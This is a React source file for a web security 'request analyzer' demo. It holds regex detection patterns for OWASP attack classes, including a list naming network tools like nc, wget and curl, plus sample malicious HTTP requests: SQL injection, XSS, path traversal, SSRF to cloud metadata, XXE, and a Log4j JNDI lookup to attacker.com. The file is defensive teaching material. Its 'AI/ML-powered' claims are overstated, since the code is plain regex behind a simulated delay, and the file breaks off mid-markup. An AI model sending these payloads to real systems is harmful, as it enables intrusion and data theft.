import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { 
  Shield, 
  AlertTriangle, 
  CheckCircle, 
  ArrowLeft, 
  Scan,
  Eye,
  Brain,
  Zap
} from "lucide-react";
import { Link } from "react-router-dom";

const Demo = () => {
  const [request, setRequest] = useState("");
  const [analysis, setAnalysis] = useState<any>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);

  // Production-grade security patterns covering OWASP Top 10
  const securityPatterns = {
    // A03: Injection - SQL Injection (Enhanced with context awareness)
    sqlInjection: [
      // Classic Boolean-based SQL injection
      /('|\"|`)(\s*)(or|and)(\s*)('|\"|`)(\s*)(=|!=|<>)(\s*)('|\"|`)/i,
      // SQL injection with numeric payloads
      /('|\"|`)(\s*)(or|and)(\s*)\d+(\s*)(=|!=|<>)(\s*)\d+/i,
      // UNION-based SQL injection
      /\b(union)(\s+)(all\s+)?(select)\b/i,
      // Time-based blind SQL injection
      /\b(sleep|waitfor\s+delay|pg_sleep|benchmark)\s*\(/i,
      // Stacked queries
      /;\s*(select|insert|update|delete|drop|create|alter|exec|declare)\b/i,
      // SQL comments for evasion
      /('|\"|`)(\s*)(or|and)(\s*).*(-{2,}|\/\*|\*\/)/i,
      // Boolean blind SQL injection
      /('|\"|`)(\s*)(or|and)(\s*)(if|case|when|iif)\s*\(/i,
      // Database-specific functions
      /\b(substring|substr|ascii|char|concat|version|database|user|current_user)\s*\(/i,
      // Error-based SQL injection
      /('|\"|`)(\s*)(or|and)(\s*)(extractvalue|updatexml|exp|floor|rand)\s*\(/i,
      // Advanced SQL injection with hex/char encoding
      /\b(0x[0-9a-f]+|char\(\d+\))/i
    ],
    
    // A03: Injection - Cross-Site Scripting (XSS)
    xss: [
      // Script tags (various forms)
      /<script[^>]*>[\s\S]*?<\/script>/gi,
      /<script[^>]*>/gi,
      // Event handlers
      /\bon(load|click|error|focus|blur|change|submit|mouseover|mouseout|keydown|keyup)\s*=/i,
      // JavaScript protocol
      /javascript\s*:/i,
      // Image/media with event handlers
      /<(img|audio|video|source)[^>]*on\w+[^>]*>/i,
      // SVG with script content
      /<svg[^>]*on\w+[^>]*>/i,
      // Iframe with javascript
      /<iframe[^>]*src\s*=\s*["\']javascript:/i,
      // HTML5 elements with event handlers
      /<(details|summary|marquee)[^>]*on\w+[^>]*>/i,
      // CSS expression attacks
      /expression\s*\(/i,
      // Data URLs with script
      /data\s*:\s*text\/html[^;]*;[^,]*,[\s\S]*<script/i,
      // Eval and related functions
      /\b(eval|setTimeout|setInterval)\s*\(/i
    ],
    
    // A03: Injection - Path Traversal
    pathTraversal: [
      // Classic directory traversal
      /(\.\.[\/\\]){2,}/,
      // URL encoded traversal
      /(%2e%2e[%2f%5c]){2,}/i,
      // Double URL encoded
      /(%252e%252e[%252f%255c]){2,}/i,
      // Sensitive file access
      /[\/\\](etc[\/\\]passwd|windows[\/\\]system32|boot\.ini|web\.config|\.htaccess)/i,
      // Null byte injection
      /%00/i,
      // Unicode traversal
      /(\u002e\u002e[\/\\]){2,}/i
    ],
    
    // A03: Injection - Command Injection
    commandInjection: [
      // Command separators with system commands
      /[;&|`]\s*(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname|chmod|rm|del)/i,
      // Backticks command execution
      /`[^`]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^`]*`/i,
      // Shell command substitution
      /\$\([^)]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^)]*\)/i,
      // Network and system tools
      /\b(nc|netcat|wget|curl|ping|nslookup|dig|telnet|ssh)\s+/i,
      // Shell interpreters
      /[\/\\](bin[\/\\])?(sh|bash|zsh|csh|cmd|powershell|python|perl|ruby)\b/i
    ],
    
    // A03: Injection - LDAP Injection
    ldapInjection: [
      /\*\)\(|\)\(\*/,
      /\(\|\(/,
      /\)\(objectClass=\*/i,
      /\(\&\(/,
      /\)\(\|\(/
    ],
    
    // A03: Injection - NoSQL Injection
    nosqlInjection: [
      /\$where\s*:/i,
      /\$regex\s*:/i,
      /\$ne\s*:/i,
      /\$gt\s*:/i,
      /\$lt\s*:/i,
      /\$or\s*:\s*\[/i,
      /\$and\s*:\s*\[/i
    ],
    
    // A03: Injection - XXE (XML External Entity)
    xxe: [
      /<!ENTITY\s+\w+\s+SYSTEM\s*["'][^"']*["']\s*>/i,
      /<!DOCTYPE[^>]+\[[\s\S]*<!ENTITY[^>]+SYSTEM/i,
      /&\w+;.*file:\/\/|&\w+;.*http:\/\//i
    ],
    
    // A01: Broken Access Control
    accessControl: [
      // Direct object references
      /[\/\\](admin|administrator|root|superuser|sa)[\/\\]?$/i,
      // Privilege escalation attempts
      /[?&](role|admin|privilege|access_level|user_type)=(admin|root|administrator|superuser)/i,
      // Force browsing sensitive paths
      /[\/\\](config|configuration|settings|env|backup|private|internal)/i,
      // API endpoint abuse
      /[\/\\]api[\/\\]v?\d*[\/\\](admin|internal|private|debug)/i
    ],
    
    // A05: Security Misconfiguration
    misconfiguration: [
      // Exposed configuration files
      /\.(env|config|ini|conf|cfg|properties|yaml|yml|json)$/i,
      // Git/SVN exposure
      /\.git[\/\\](config|HEAD|index|logs)/i,
      // Backup files
      /\.(bak|backup|old|orig|tmp|temp|swp|~)$/i,
      // Debug/info pages
      /\/(phpinfo|info|debug|test|status|actuator|health)/i,
      // Server status pages
      /\/(server-status|server-info|admin-console)/i
    ],
    
    // A06: Vulnerable Components
    vulnerableComponents: [
      // Log4j exploitation
      /\$\{jndi:(ldap|rmi|dns):/i,
      // Struts2 vulnerabilities
      /%(23|25)(\w+|%\w+)*=|ognl:/i,
      // Deserialization attacks
      /\b(ObjectInputStream|readObject|XMLDecoder|Serializable)/i
    ],
    
    // A07: Authentication Failures
    authFailures: [
      // Weak passwords in requests
      /password=(123456|password|admin|root|guest|test|1234|qwerty)/i,
      // Default credentials
      /username=(admin|administrator|root|sa|guest)&password=(admin|password|root|123456)/i,
      // Session fixation
      /[?&]sessionid=[a-zA-Z0-9]{1,10}$/i,
      // Exposed tokens
      /[?&](token|key|secret)=[a-zA-Z0-9]{1,20}$/i
    ],
    
    // A10: Server-Side Request Forgery (SSRF)
    ssrf: [
      // Internal network access
      /url=https?:\/\/(127\.0\.0\.1|localhost|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|0\.0\.0\.0)/i,
      // Cloud metadata endpoints
      /url=https?:\/\/(169\.254\.169\.254|metadata\.google\.internal)/i,
      // File protocol
      /url=file:\/\/\//i,
      // FTP/SFTP protocols
      /url=(ftp|sftp|gopher|dict|ldap):\/\//i
    ],
    
    // Additional patterns for comprehensive coverage
    maliciousPatterns: [
      // Webshells
      /\b(eval|system|exec|shell_exec|passthru|file_get_contents|fopen|fwrite)\s*\(/i,
      // Malicious file uploads
      /\.(php|asp|aspx|jsp|pl|py|rb|sh|exe|bat|cmd)(\.|$)/i,
      // Suspicious encoding
      /(%[0-9a-f]{2}){10,}/i,
      // Polyglot payloads
      /javascript:[^"']*[<>]/i
    ]
  };

  const detectThreats = (requestText: string) => {
    const threats: any[] = [];
    const decodedRequest = decodeURIComponent(requestText);
    
    // Normalize request for better detection
    const normalizedRequest = requestText.toLowerCase();
    const normalizedDecoded = decodedRequest.toLowerCase();
    
    // Context-aware validation helpers
    const isValidProductSearch = (text: string) => {
      // Valid product searches: category=electronics, search=laptop, etc.
      return /^[a-zA-Z0-9\s\-_+%&=.,:;()\[\]{}@#!?<>|~/\\]*$/.test(text) &&
             !/\b(union|select|or\s+\d+\s*=\s*\d+|and\s+\d+\s*=\s*\d+|script|javascript|onerror)/i.test(text);
    };
    
    const isValidPagination = (text: string) => {
      return /^[?&]page=\d+|sort=(price_asc|price_desc|rating_desc|newest|popularity)/.test(text);
    };
    
    const isValidApiPath = (text: string) => {
      return /^(GET|POST|PUT|DELETE)\s+\/[a-zA-Z0-9\/_\-]+(\?[a-zA-Z0-9&=_\-]+)?/.test(text);
    };
    
    // A03: SQL Injection Detection (Enhanced with context)
    securityPatterns.sqlInjection.forEach((pattern, index) => {
      const match1 = pattern.test(requestText);
      const match2 = pattern.test(decodedRequest);
      
      if (match1 || match2) {
        // Advanced false positive reduction
        const isFalsePositive = 
          isValidProductSearch(requestText) ||
          isValidPagination(requestText) ||
          // Check for legitimate SQL keywords in API documentation
          /\/api\/docs|\/swagger|\/documentation/i.test(requestText) ||
          // Valid JSON payloads with legitimate field names
          (/Content-Type:\s*application\/json/i.test(requestText) && 
           !/(union\s+select|or\s+'?\d+\s*=\s*\d+|sleep\s*\()/i.test(requestText));
        
        if (!isFalsePositive) {
          threats.push({
            type: "SQL Injection",
            severity: "critical",
            category: "A03:2021 - Injection",
            pattern: `SQL Pattern ${index + 1}`,
            description: "SQL injection attack detected - unauthorized database access attempt",
            location: "Query parameters or request body",
            confidence: match1 && match2 ? "high" : "medium"
          });
        }
      }
    });

    // A03: XSS Detection
    securityPatterns.xss.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        // Reduce false positives for legitimate HTML in documentation
        const isFalsePositive = 
          /\/api\/docs|\/help|\/documentation|Content-Type:\s*text\/html/i.test(requestText) &&
          !/javascript:|onerror|onload|onclick/i.test(requestText);
          
        if (!isFalsePositive) {
          threats.push({
            type: "Cross-Site Scripting (XSS)",
            severity: "high",
            category: "A03:2021 - Injection",
            pattern: `XSS Pattern ${index + 1}`,
            description: "XSS attack vector identified - potential script injection",
            location: "Request parameters or headers",
            confidence: "high"
          });
        }
      }
    });

    // A03: Path Traversal Detection
    securityPatterns.pathTraversal.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Path Traversal",
          severity: "high",
          category: "A03:2021 - Injection",
          pattern: `Path Traversal Pattern ${index + 1}`,
          description: "Directory traversal attempt detected - unauthorized file access",
          location: "URL path or parameters",
          confidence: "high"
        });
      }
    });

    // A03: Command Injection Detection
    securityPatterns.commandInjection.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Command Injection",
          severity: "critical",
          category: "A03:2021 - Injection",
          pattern: `Command Injection Pattern ${index + 1}`,
          description: "Command injection attempt detected - potential system compromise",
          location: "Request parameters",
          confidence: "high"
        });
      }
    });

    // A03: LDAP Injection Detection
    securityPatterns.ldapInjection.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "LDAP Injection",
          severity: "high",
          category: "A03:2021 - Injection",
          pattern: `LDAP Pattern ${index + 1}`,
          description: "LDAP injection attempt detected - unauthorized directory access",
          location: "Authentication parameters",
          confidence: "medium"
        });
      }
    });

    // A03: NoSQL Injection Detection
    securityPatterns.nosqlInjection.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "NoSQL Injection",
          severity: "high",
          category: "A03:2021 - Injection",
          pattern: `NoSQL Pattern ${index + 1}`,
          description: "NoSQL injection attempt detected - database manipulation",
          location: "Request body or parameters",
          confidence: "medium"
        });
      }
    });

    // A03: XXE Detection
    securityPatterns.xxe.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "XML External Entity (XXE)",
          severity: "critical",
          category: "A03:2021 - Injection",
          pattern: `XXE Pattern ${index + 1}`,
          description: "XXE attack detected - potential file disclosure or SSRF",
          location: "XML data in request body",
          confidence: "high"
        });
      }
    });

    // A01: Broken Access Control
    securityPatterns.accessControl.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        // Don't flag legitimate admin API endpoints with proper authorization
        const hasProperAuth = /Authorization:\s*Bearer\s+[A-Za-z0-9\-._~+/]+=*/i.test(requestText);
        const isLegitimateAdminAPI = hasProperAuth && /\/api\/admin\//i.test(requestText);
        
        if (!isLegitimateAdminAPI) {
          threats.push({
            type: "Broken Access Control",
            severity: "critical",
            category: "A01:2021 - Broken Access Control",
            pattern: `Access Control Pattern ${index + 1}`,
            description: "Unauthorized access attempt to privileged resources",
            location: "URL path or parameters",
            confidence: hasProperAuth ? "low" : "high"
          });
        }
      }
    });

    // A05: Security Misconfiguration
    securityPatterns.misconfiguration.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Security Misconfiguration",
          severity: "medium",
          category: "A05:2021 - Security Misconfiguration",
          pattern: `Misconfiguration Pattern ${index + 1}`,
          description: "Access to sensitive configuration files or debug information",
          location: "URL path",
          confidence: "high"
        });
      }
    });

    // A06: Vulnerable Components
    securityPatterns.vulnerableComponents.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Vulnerable Component Exploitation",
          severity: "critical",
          category: "A06:2021 - Vulnerable Components",
          pattern: `Vulnerable Component Pattern ${index + 1}`,
          description: "Exploitation of known vulnerable component (Log4j, Struts2, etc.)",
          location: "Request parameters or headers",
          confidence: "high"
        });
      }
    });

    // A07: Authentication Failures
    securityPatterns.authFailures.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Authentication Failure",
          severity: "high",
          category: "A07:2021 - Authentication Failures",
          pattern: `Auth Failure Pattern ${index + 1}`,
          description: "Weak authentication attempt or credential exposure",
          location: "Request body or parameters",
          confidence: "medium"
        });
      }
    });

    // A10: Server-Side Request Forgery (SSRF)
    securityPatterns.ssrf.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Server-Side Request Forgery (SSRF)",
          severity: "critical",
          category: "A10:2021 - SSRF",
          pattern: `SSRF Pattern ${index + 1}`,
          description: "SSRF attempt detected - potential internal network access",
          location: "URL parameters",
          confidence: "high"
        });
      }
    });

    // Additional Malicious Patterns
    securityPatterns.maliciousPatterns.forEach((pattern, index) => {
      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
        threats.push({
          type: "Malicious Pattern",
          severity: "high",
          category: "General Malicious Activity",
          pattern: `Malicious Pattern ${index + 1}`,
          description: "Suspicious pattern detected - potential malicious activity",
          location: "Request content",
          confidence: "medium"
        });
      }
    });

    // CSRF Protection Check (Enhanced)
    if (/^(POST|PUT|DELETE|PATCH)\s+/i.test(requestText)) {
      const hasCSRFProtection = /X-CSRF-Token|csrf_token|_token|X-Requested-With:\s*XMLHttpRequest/i.test(requestText);
      const isAPIEndpoint = /\/api\/|Content-Type:\s*application\/json/i.test(requestText);
      
      // Only flag as CSRF issue if it's not an API endpoint (which typically use other auth methods)
      if (!hasCSRFProtection && !isAPIEndpoint) {
        threats.push({
          type: "CSRF Vulnerability",
          severity: "medium",
          category: "A04:2021 - Insecure Design",
          pattern: "Missing CSRF protection",
          description: "State-changing request without CSRF protection",
          location: "Request headers or body",
          confidence: "medium"
        });
      }
    }

    // Enhanced Encoding Analysis
    const encodingPatterns = [
      /%[0-9a-f]{2}/gi,     // URL encoding
      /\\x[0-9a-f]{2}/gi,   // Hex encoding
      /&#[0-9]+;/gi,        // HTML entities
      /\\u[0-9a-f]{4}/gi,   // Unicode encoding
      /\+/g                 // Space encoding in URL
    ];
    
    let totalEncodedChars = 0;
    encodingPatterns.forEach(pattern => {
      const matches = requestText.match(pattern);
      if (matches) totalEncodedChars += matches.length;
    });

    // High encoding density indicates evasion attempt
    if (totalEncodedChars > 10 && (totalEncodedChars / requestText.length) > 0.3) {
      threats.push({
        type: "Encoded Payload Evasion",
        severity: "medium",
        category: "Evasion Technique",
        pattern: "High encoding density detected",
        description: "Suspicious encoding patterns - potential evasion attempt",
        location: "Request payload",
        confidence: "medium"
      });
    }

    // Remove duplicates based on type and category
    const uniqueThreats = threats.filter((threat, index, self) => 
      index === self.findIndex(t => t.type === threat.type && t.category === threat.category)
    );

    return uniqueThreats;
  };

  const analyzeRequest = () => {
    if (!request?.trim()) return;
    
    setIsAnalyzing(true);
    
    // Simulate analysis delay for realistic UX
    setTimeout(() => {
      const threats = detectThreats(request);
      
      // Enhanced risk scoring based on OWASP categories and confidence
      let riskScore = 0;
      threats.forEach(threat => {
        const baseScore = {
          'critical': 35,
          'high': 25,
          'medium': 15,
          'low': 5
        }[threat.severity] || 10;
        
        const confidenceMultiplier = {
          'high': 1.0,
          'medium': 0.8,
          'low': 0.5
        }[threat.confidence] || 0.7;
        
        // OWASP category multipliers (some are more severe)
        const owaspMultiplier = threat.category?.includes('A01') || 
                               threat.category?.includes('A03') || 
                               threat.category?.includes('A06') || 
                               threat.category?.includes('A10') ? 1.2 : 1.0;
        
        riskScore += Math.floor(baseScore * confidenceMultiplier * owaspMultiplier);
      });
      
      // Cap at 100 and ensure minimum score for any threats
      riskScore = Math.min(100, riskScore);
      if (threats.length > 0 && riskScore < 25) riskScore = 25;
      
      setAnalysis({
        threats,
        riskScore,
        isClean: threats.length === 0,
        detectionMethod: threats.length > 0 ? 
          "OWASP Top 10 + Signature & ML-based Detection" : 
          "Clean Request - No Threats Detected",
        totalThreats: threats.length,
        criticalThreats: threats.filter(t => t.severity === 'critical').length,
        highThreats: threats.filter(t => t.severity === 'high').length,
        categories: [...new Set(threats.map(t => t.category).filter(Boolean))]
      });
      setIsAnalyzing(false);
    }, 2000); // Slightly longer for more realistic analysis feel
  };

  const exampleRequests = {
    // ========== VALID REQUESTS (Should NOT be flagged) ==========
    
    // Basic Navigation
    homepage: `GET / HTTP/1.1
Host: localhost:3000`,
    
    // Product & E-commerce
    productListing: `GET /products?category=electronics&page=1 HTTP/1.1
Host: localhost:3000
Referer: https://localhost:3000/products`,
    
    productSearch: `GET /search?q=wireless+earbuds&sort=rating_desc HTTP/1.1
Host: localhost:3000`,
    
    productDetails: `GET /product/12345?variant=blue HTTP/1.1
Host: localhost:3000`,
    
    complexSearch: `GET /products?search=gaming+laptop+RTX+3060&price_min=300&price_max=700&sort=price_desc HTTP/1.1
Host: localhost:3000`,
    
    // User Actions
    userOrders: `GET /user/orders?page=1&status=shipped HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`,
    
    addToCartJSON: `POST /cart/add HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "product_id": 98765,
  "quantity": 1,
  "variant": "red"
}`,
    
    loginForm: `POST /login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

username=johndoe&password=SecurePass123`,
    
    checkoutAPI: `POST /checkout HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer valid_token_here

{
  "cart_id": "abc123",
  "payment_method": "card",
  "address_id": "addr001"
}`,
    
    webhookValid: `POST /webhook/stripe HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"id":"evt_1","type":"payment_intent.succeeded","data":{"object":{"id":"pi_123"}}}`,

    // ========== MALICIOUS REQUESTS (Should be flagged) ==========
    
    // A03: SQL Injection Attacks
    sqlInjectionOR: `GET /search?q=' OR '1'='1'-- HTTP/1.1
Host: vulnerable.lab
User-Agent: Mozilla/5.0`,
    
    sqlInjectionUnion: `GET /products?id=10 UNION SELECT username, password FROM users-- HTTP/1.1
Host: vulnerable.lab
User-Agent: Mozilla/5.0`,

    sqlInjectionTime: `GET /search?q=' OR IF(1=1, SLEEP(5), 0)-- HTTP/1.1
Host: vulnerable.lab
User-Agent: Mozilla/5.0`,
    
    sqlInjectionLogin: `POST /login HTTP/1.1
Host: vulnerable.lab
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything`,
    
    sqlInjectionStacked: `GET /products?id=1; DROP TABLE users HTTP/1.1
Host: vulnerable.lab`,
    
    // A03: XSS Attacks
    xssScript: `GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: vulnerable.lab`,
    
    xssImage: `GET /products?category=<img src=x onerror=alert(1)> HTTP/1.1
Host: vulnerable.lab`,

    xssComment: `POST /comment HTTP/1.1
Host: vulnerable.lab
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('XSS')</script>`,
    
    xssAdvanced: `GET /search?q=<details open ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1
Host: vulnerable.lab`,
    
    // A03: Path Traversal
    pathTraversal: `GET /download?file=../../../../etc/passwd HTTP/1.1
Host: vulnerable.lab`,
    
    pathTraversalEncoded: `GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: vulnerable.lab`,
    
    // A03: Command Injection
    commandInjection: `GET /ping?host=127.0.0.1;ls HTTP/1.1
Host: vulnerable.lab`,
    
    commandInjectionBacktick: `GET /ping?host=\`whoami\` HTTP/1.1
Host: vulnerable.lab`,
    
    // A01: Broken Access Control
    adminAccess: `GET /admin HTTP/1.1
Host: vulnerable.lab`,
    
    privilegeEscalation: `GET /api/users?role=admin HTTP/1.1
Host: vulnerable.lab`,
    
    // A05: Security Misconfiguration
    gitExposure: `GET /.git/config HTTP/1.1
Host: vulnerable.lab`,
    
    envFile: `GET /.env HTTP/1.1
Host: vulnerable.lab`,
    
    phpInfo: `GET /phpinfo.php HTTP/1.1
Host: vulnerable.lab`,
    
    // A06: Vulnerable Components
    log4jExploit: `GET /api/search?query=\${jndi:ldap://attacker.com/x} HTTP/1.1
Host: vulnerable.lab`,
    
    // A07: Authentication Failures
    weakPassword: `POST /api/login HTTP/1.1
Host: vulnerable.lab
Content-Type: application/json

{"username":"admin","password":"123456"}`,
    
    defaultCredentials: `POST /login HTTP/1.1
Host: vulnerable.lab
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin`,
    
    // A10: Server-Side Request Forgery (SSRF)
    ssrfInternal: `GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: vulnerable.lab`,
    
    ssrfMetadata: `GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable.lab`,
    
    ssrfFile: `GET /fetch?url=file:///etc/passwd HTTP/1.1
Host: vulnerable.lab`,
    
    // Encoded Attacks
    urlEncodedSqli: `GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1
Host: vulnerable.lab`,
    
    hexEncodedSqli: `GET /search?q=\\x27\\x20OR\\x20\\x31\\x3D\\x31 HTTP/1.1
Host: vulnerable.lab`,
    
    // XXE Attack
    xxeAttack: `POST /api/data HTTP/1.1
Host: vulnerable.lab
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    
    // NoSQL Injection
    nosqlInjection: `POST /api/login HTTP/1.1
Host: vulnerable.lab
Content-Type: application/json

{"username":"admin","password":{"$ne":""}}`
  };

  return (
    <div className="min-h-screen bg-gradient-dark">
      {/* Navigation */}
      <nav className="fixed top-0 w-full bg-background/80 backdrop-blur-md border-b border-border z-50">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <Link to="/" className="flex items-center space-x-2">
            <ArrowLeft className="h-5 w-5 text-muted-foreground" />
            <Shield className="h-8 w-8 text-primary" />
            <span className="text-xl font-bold gradient-text">SentinelX</span>
          </Link>
          
          <Badge variant="secondary" className="glow-cyber">
            <Scan className="h-4 w-4 mr-2" />
            Security Demo
          </Badge>
        </div>
      </nav>

      {/* Main Content */}
      <div className="pt-20 pb-12 px-4">
        <div className="container mx-auto max-w-7xl">
          {/* Hero Section */}
          <div className="text-center mb-16 relative">
            <div className="absolute inset-0 cyber-grid opacity-20"></div>
            <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-transparent to-secondary/5"></div>
            
            <div className="relative z-10 space-y-6">
              <div className="inline-flex items-center px-4 py-2 rounded-full bg-primary/10 border border-primary/20 mb-4">
                <Shield className="h-4 w-4 mr-2 text-primary" />
                <span className="text-sm font-medium text-primary">Advanced Security Analysis</span>
              </div>
              <h1 className="text-5xl md:text-7xl font-bold mb-6 tracking-tight">
                <span className="gradient-text">Security Request</span>
                <br />
                <span className="text-foreground">Analyzer</span>
              </h1>
              <p className="text-xl text-muted-foreground max-w-3xl mx-auto leading-relaxed">
                Enterprise-grade security testing platform powered by AI. Detect SQL injection, XSS, CSRF, 
                and 200+ other attack vectors with military-grade precision.
              </p>
            </div>
          </div>

          <div className="grid lg:grid-cols-5 gap-8">
            {/* Input Section */}
            <div className="lg:col-span-2">
              <Card className="backdrop-blur-sm bg-card/30 border-border/50 shadow-2xl hover:shadow-cyber/20 transition-all duration-300">
                <CardHeader className="pb-6">
                  <CardTitle className="flex items-center text-xl">
                    <div className="p-3 rounded-xl bg-gradient-cyber mr-3">
                      <Eye className="h-5 w-5 text-white" />
                    </div>
                    Request Input
                  </CardTitle>
                  <CardDescription className="text-base text-muted-foreground">
                    Paste your HTTP request to analyze for security threats
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="relative group">
                    <Textarea
                      placeholder={`GET /products?search=' OR '1'='1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0...`}
                      value={request}
                      onChange={(e) => setRequest(e.target.value)}
                      className="min-h-[320px] font-mono text-sm bg-muted/20 border-border/30 focus:border-primary/50 transition-all duration-300 resize-none group-hover:bg-muted/30"
                    />
                    <div className="absolute bottom-3 right-3 text-xs text-muted-foreground bg-background/80 px-2 py-1 rounded">
                      {request.length} chars
                    </div>
                  </div>
                  <Button 
                    onClick={analyzeRequest}
                    disabled={!request?.trim() || isAnalyzing}
                    size="lg"
                    className="w-full h-14 bg-gradient-cyber hover:shadow-cyber transition-all duration-300 transform hover:scale-[1.02] text-lg font-semibold"
                  >
                    {isAnalyzing ? (
                      <>
                        <div className="animate-spin rounded-full h-6 w-6 border-2 border-current border-t-transparent mr-3" />
                        Analyzing Security Threats...
                      </>
                    ) : (
                      <>
                        <Shield className="h-6 w-6 mr-3" />
                        Run Security Analysis
                      </>
                    )}
                  </Button>
                
                  {/* Enhanced Example Requests */}
                  <div className="space-y-4 pt-4 border-t border-border/30">
                    <p className="text-sm font-semibold text-foreground">Quick Test Examples</p>
                    <div className="grid grid-cols-1 gap-3">
                      {/* Valid Requests */}
                      <div className="space-y-2">
                        <div className="flex items-center">
                          <div className="w-2 h-2 bg-secondary rounded-full mr-2"></div>
                          <p className="text-xs font-medium text-secondary">Valid Requests</p>
                        </div>
                        <div className="grid grid-cols-2 gap-2">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setRequest(exampleRequests.homepage)}
                            className="text-xs h-8 hover:bg-secondary/10 hover:border-secondary/30 transition-colors"
                          >
                            Homepage
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setRequest(exampleRequests.productListing)}
                            className="text-xs h-8 hover:bg-secondary/10 hover:border-secondary/30 transition-colors"
                          >
                            Product API
                          </Button>
                        </div>
                      </div>

                      {/* Malicious Requests */}
                      <div className="space-y-2">
                        <div className="flex items-center">
                          <div className="w-2 h-2 bg-destructive rounded-full mr-2"></div>
                          <p className="text-xs font-medium text-destructive">Attack Examples</p>
                        </div>
                        <div className="grid grid-cols-2 gap-2">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setRequest(exampleRequests.sqlInjectionOR)}
                            className="text-xs h-8 hover:bg-destructive/10 hover:border-destructive/30 transition-colors"
                          >
                            SQL Injection
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setRequest(exampleRequests.xssScript)}
                            className="text-xs h-8 hover:bg-destructive/10 hover:border-destructive/30 transition-colors"
                          >
                            XSS Attack
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Analysis Results */}
            <div className="lg:col-span-3">
              <Card className="backdrop-blur-sm bg-card/30 border-border/50 shadow-2xl hover:shadow-tech/20 transition-all duration-300">
                <CardHeader className="pb-6">
                  <CardTitle className="flex items-center text-xl">
                    <div className="p-3 rounded-xl bg-gradient-tech mr-3">
                      <Brain className="h-5 w-5 text-white" />
                    </div>
                    Security Analysis
                  </CardTitle>
                  <CardDescription className="text-base text-muted-foreground">
                    Real-time threat detection and comprehensive risk assessment
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  {!analysis ? (
                    <div className="text-center py-16 text-muted-foreground">
                      <div className="relative">
                        <div className="absolute inset-0 bg-gradient-to-r from-primary/20 via-transparent to-secondary/20 rounded-full blur-xl opacity-50"></div>
                        <Shield className="relative h-16 w-16 mx-auto mb-6 opacity-40" />
                      </div>
                      <h3 className="text-lg font-semibold mb-2">Ready to Analyze</h3>
                      <p className="text-sm">Submit a request to see comprehensive security analysis</p>
                    </div>
                  ) : (
                    <div className="space-y-8">
                      {/* Enhanced Risk Score Display */}
                      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-muted/30 to-muted/10 p-6 border border-border/30">
                        <div className="absolute inset-0 bg-gradient-to-r from-primary/5 via-transparent to-secondary/5"></div>
                        <div className="relative flex items-center justify-between">
                          <div className="space-y-2">
                            <p className="text-sm text-muted-foreground font-medium">Overall Risk Score</p>
                            <div className="flex items-baseline space-x-2">
                              <span className={`text-4xl font-bold ${
                                analysis.riskScore === 0 ? "text-secondary" : 
                                analysis.riskScore < 50 ? "text-yellow-500" : "text-destructive"
                              }`}>
                                {analysis.riskScore}
                              </span>
                              <span className="text-xl text-muted-foreground font-medium">/100</span>
                            </div>
                            <p className="text-xs text-muted-foreground">{analysis.detectionMethod}</p>
                          </div>
                          <div className="text-right space-y-3">
                            <Badge 
                              variant={analysis.isClean ? "secondary" : "destructive"}
                              className={`px-4 py-2 text-sm font-semibold ${
